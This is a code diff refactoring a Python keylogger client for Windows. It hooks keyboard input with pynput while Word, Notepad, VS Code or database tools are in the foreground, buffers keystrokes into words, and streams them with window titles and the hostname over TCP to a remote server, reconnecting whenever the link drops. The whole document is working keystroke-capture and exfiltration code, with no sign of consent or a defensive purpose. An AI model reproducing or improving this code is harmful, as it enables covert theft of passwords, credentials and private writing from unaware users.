@@ -1,21 +1,20 @@
 import socket
 import json
-import threading
-from pynput import keyboard
 import time
 from datetime import datetime
+from pynput import keyboard
 import win32gui
 import win32process
 import psutil
+import socket as sk
 
 from config import server_config
 
 
-# Ứng dụng được phép ghi phím
 ALLOWED_APPS = [
-    "WINWORD.EXE",       # Microsoft Word
-    "notepad.exe",       # Notepad
-    "Code.exe",          # Visual Studio Code
+    "WINWORD.EXE",
+    "notepad.exe",
+    "Code.exe",
     "MySQLWorkbench.exe",
     "heidisql.exe"
 ]
@@ -25,8 +24,7 @@ def get_active_process_name():
     try:
         hwnd = win32gui.GetForegroundWindow()
         _, pid = win32process.GetWindowThreadProcessId(hwnd)
-        process = psutil.Process(pid)
-        return process.name()
+        return psutil.Process(pid).name()
     except:
         return None
 
@@ -41,30 +39,22 @@ def get_active_window_title():
 
 class KeyloggerClient:
     def __init__(self):
-        self.server_host = server_config.SERVER_IP
+        self.server_ip = server_config.SERVER_IP
         self.server_port = server_config.SERVER_HOST
-        self.view_id = socket.gethostname()
         self.sock = None
         self.word_buffer = ""
+        self.view_id = sk.gethostname()
 
     def connect(self):
-        try:
-            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.sock.connect((self.server_host, self.server_port))
-
-            init_msg = json.dumps({"type": "keylogger"}) + "\n"
-            self.sock.sendall(init_msg.encode())
-
-            print("[+] Connected to server")
-            return True
-        except:
-            print("[!] Retry connection in 3s...")
-            time.sleep(3)
-            return False
-
-    def ensure_connection(self):
-        while self.sock is None:
-            self.connect()
+        while True:
+            try:
+                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.sock.connect((self.server_ip, self.server_port))
+                print("[+] Connected to server")
+                return
+            except Exception as e:
+                print(f"[!] Cannot connect: {e}. Retry in 3s...")
+                time.sleep(3)
 
     def send_keystroke(self, key_data, window_title):
         try:
@@ -75,50 +65,51 @@ class KeyloggerClient:
                 "LoggedAt": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             }
             self.sock.sendall((json.dumps(msg) + "\n").encode())
-        except:
-            self.sock = None
-            self.ensure_connection()
 
-    def flush_word_buffer(self):
-        if self.word_buffer != "":
+        except:
+            print("[!] Lost connection → reconnecting...")
+            self.connect()
+
+    def flush_buffer(self):
+        if self.word_buffer:
             self.send_keystroke(self.word_buffer, get_active_window_title())
             self.word_buffer = ""
 
     def on_press(self, key):
         try:
-            process_name = get_active_process_name()
-
-            # ❌ Nếu không thuộc ứng dụng cho phép → Không gửi phím
-            if process_name not in ALLOWED_APPS:
+            process = get_active_process_name()
+            if process not in ALLOWED_APPS:
                 return
 
-            window_title = get_active_window_title()
+            window = get_active_window_title()
 
             if hasattr(key, "char") and key.char:
                 if key.char.isalnum():
                     self.word_buffer += key.char
                 else:
-                    self.flush_word_buffer()
-                    self.send_keystroke(key.char, window_title)
+                    self.flush_buffer()
+                    self.send_keystroke(key.char, window)
 
             else:
-                self.flush_word_buffer()
+                self.flush_buffer()
 
-                if key == keyboard.Key.space:
-                    self.send_keystroke("[SPACE]", window_title)
-                elif key == keyboard.Key.enter:
-                    self.send_keystroke("[ENTER]", window_title)
-                elif key == keyboard.Key.backspace:
-                    self.send_keystroke("[BACKSPACE]", window_title)
-                else:
-                    self.send_keystroke(str(key), window_title)
+                special_keys = {
+                    keyboard.Key.space: "[SPACE]",
+                    keyboard.Key.enter: "[ENTER]",
+                    keyboard.Key.backspace: "[BACKSPACE]"
+                }
+
+                self.send_keystroke(
+                    special_keys.get(key, str(key)),
+                    window
+                )
 
         except Exception as e:
-            print("[-] Error:", e)
+            print("❌ Error:", e)
 
     def start(self):
-        print("[*] Keylogger started...")
-        self.ensure_connection()
+        print("[*] Keylogger. Starting...")
+        self.connect()
 
         listener = keyboard.Listener(on_press=self.on_press)
         listener.start()
